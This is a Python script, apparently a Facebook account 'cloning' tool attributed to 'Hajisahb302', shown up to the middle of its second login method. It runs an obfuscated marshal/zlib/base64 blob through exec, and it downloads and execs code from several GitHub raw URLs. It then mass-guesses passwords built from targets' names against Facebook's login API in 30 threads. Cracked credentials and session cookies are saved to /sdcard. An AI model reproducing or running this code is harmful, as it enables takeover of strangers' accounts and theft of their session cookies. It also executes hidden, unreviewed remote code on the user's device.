#<<_________[ IMPORTING MODULES ]_________>>#
import os,time
#<<_________[ COLOR ]_________>>#
W = '\033[97;1m'
R = '\033[91;1m' 
G = '\033[92;1m'
#<<_________[ INSTALLATION MODULES ]_________>>#
try:
    import requests
    import marshal
    from string import *
    from bs4 import BeautifulSoup
    from bs4 import BeautifulSoup as sop
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
    os.system('pip install requests > /dev/null')
except:pass
import json,time,re,random,sys,uuid,string,subprocess,zlib,platform,base64
try:import arrow
except:os.system('pip install arrow');import arrow
try:import httplib2
except ModuleNotFoundError:
    try:
        with open(os.devnull, 'w') as null:
            subprocess.check_call(["pip", "install", " httplib2"], stdout=null, stderr=null)
            import httplib2
    except subprocess.CalledProcessError:
        print(f" Module Installing Failed")
        exit()
#<<_________[ PROTECT-DATA-CAPTURE-&-BYPASS ]_________>>#
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))
#<<_________[ All Method Code & Loc & User-Agent & Version ]_________>>#
#<<_________[ Method 1 User-Agent ]_________>>#
try:
    data = requests.get('https://raw.githubusercontent.com/Hajisahb302-Naam-To-Suna-Hoga/Update/main/M1_M2').text
    exec(data)
except:
    print('\033[97;1m You Have No Internet Connection ..!');exit()
#<<_________[ Method 2 User-Agent ]_________>>#
try:
    data = requests.get('https://raw.githubusercontent.com/Hajisahb302-Naam-To-Suna-Hoga/Update/main/M3_M4').text
    exec(data)
except:
    print('\033[97;1m You Have No Internet Connection ..!');exit()
#<<_________[ All Method Code & Loc ]_________>>#
try:
    data = requests.get('https://raw.githubusercontent.com/Hajisahb302-Naam-To-Suna-Hoga/Update/main/Code_Loc').text
    exec(data)
except:
    print('\033[97;1m You Have No Internet Connection ..!');exit()
#<<_________[ Hajisahb302 Version ]_________>>#
try:
    version = requests.get('https://raw.githubusercontent.com/Hajisahb302-786/Hajisahb302/main/Version').text
except:
    print('\033[97;1m You Have No Internet Connection ..!');exit()
version = version.strip()
#<<_________[ Setup ]_________>>#
try:
    status = requests.get('https://raw.githubusercontent.com/Hajisahb302-786/Hajisahb302/main/Status').text
except:
    print('\033[97;1m You Have No Internet Connection ..!');exit()
status = status.strip()
#####_____Folder-Setup_____#####
try:
    os.makedirs('/sdcard/Hajisahb302')
except:
    pass
sys.stdout.write('\x1b]2;Hajisahb302\x07')
#<<_________[ LOGO ]_________>>#
logo=(f"""{W}  _        _______  _______  _______  _______ 
 ( \      (  ___  )(  ____ \(  ____ \(  ____ )
 | (      | (   ) || (    \/| (    \/| (    )|
 | |      | |   | || (_____ | (__    | (____)|
 | |      | |   | |(_____  )|  __)   |     __)
 | |      | |   | |      ) || (      | (\ (   
 | (____/\| (___) |/\____) || (____/\| ) \ \__
 (_______/(_______)\_______)(_______/|/   \__/
{W} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{W} [•]{W} Admin      : Hajisahb302
{W} [•]{W} Status     : {status}
{W} [•]{W} Version    : {version}
{W} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
loop=0
oks=[]
cps=[]
cp=[]
ok=[]
pcp=[]
def line():
    print(f"{W} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
def clear():
    os.system(f'clear')
    print(logo)
#<<_________[ Main Menu ]_________>>#
def menu():
    clear()
    print(f"{W} [1] File Cloning")
    print(f"{W} [2] Join Whatsapp Group")
    print(f"{W} [0] EXIT")
    line()
    xd=input(f'{W} [•]{W} Choose: ')
    if xd in ['1','01']:
        clear()
        print(f'{W} [•]{W} EXAMPLE:  /sdcard/File.txt  etc..')
        line()
        file = input(f'{W} [•]{W} Put File\033[1;37m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f'{W} [•]{W} File Not Found ')
            time.sleep(1)
            exit()
        clear()
        print(f'{W}\t         All Method Working')
        line()
        print(f'{W} [1] Method 1')
        print(f'{W} [2] Method 2')
        print(f'{W} [3] Method 3')
        line()
        mthd=input(f'{W} [•]{W} Choose: ')
        clear()
        plist = []
        try:
            ps_limit = int(input(f'{W} [•]{W} Pass Limit : '))
        except:
            ps_limit = 2
        clear()
        print(f'{W} [•]{W} EXP: first last,firtslast,first123')
        line()
        for i in range(ps_limit):
                plist.append(input(f'{W} [•]{W} Put Pass {i+1}: '))
        clear()
        print(f'{W} [•]{W} Do You Want To Show Cp Ids ? (y/n): ')
        line()
        cx=input(f'{W} [•]{W} Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(f'{W} [•]{W} Total Account :{G} '+total_ids+f' ')
            print(f'{W} [•] Use Flight Mode After Every 2 Minutes')
            line()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb1,ids,names,passlist)
                elif mthd in ['2','02']:
                    crack_submit.submit(ffb2,ids,names,passlist)
                elif mthd in ['3','03']:
                    crack_submit.submit(ffb3,ids,names,passlist)
        print(f'\033[1;37m')
        line()
        print(f'{W} [•]{W} The Process Hase Been Complted')
        print(f"{W} [•]{W} OK IDZ : {G}%s "%(len(oks)))
        print(f"{W} [•]{W} CP IDZ : {R}%s "%(len(cps)))
        line()
        input(f'{W} [•]{W} Press Enter To Main Menu ')
        menu()
    elif xd in ['2','02']:
        os.system('xdg-open https://chat.whatsapp.com/FDUh5Kj6qOED0VSYx40Oex')
        menu()
    elif xd in ['0','00']:
        clear()
        exit(f'{W} [•]{W} Thanks For Use ')
    else:
        line()
        print(f'{W} [•]{W} Wrong Choose')
        time.sleep(2)
        menu()
#<<_________[ METHOD 1 ]_________>>#
def ffb1(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                sys.stdout.write(f'\r\r{W} [Hajisahb302-M1] %s|OK/CP %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": code1,"client_country_code": loc1,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": M1(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers,allow_redirects=False).text
                        q = json.loads(po)
                        if 'session_key' in q:
                                        print(f'\r\r{G} [Hajisahb302-OK] '+ids+' | '+pas+'\033[93;1m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/Hajisahb302/Hajisahb302-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/Hajisahb302/Hajisahb302-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        #free(ids,pas,cookies)
                                        break
                        elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r{R} [Hajisahb302-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/Hajisahb302/Hajisahb302-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        if 'n' in pcp:
                                                open(f'/sdcard/Hajisahb302/Hajisahb302-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20) 
        except Exception as e:pass
#<<_________[ METHOD 2 ]_________>>#
def ffb2(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f'\r\r{W} [Hajisahb302-M2] %s|OK/CP %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
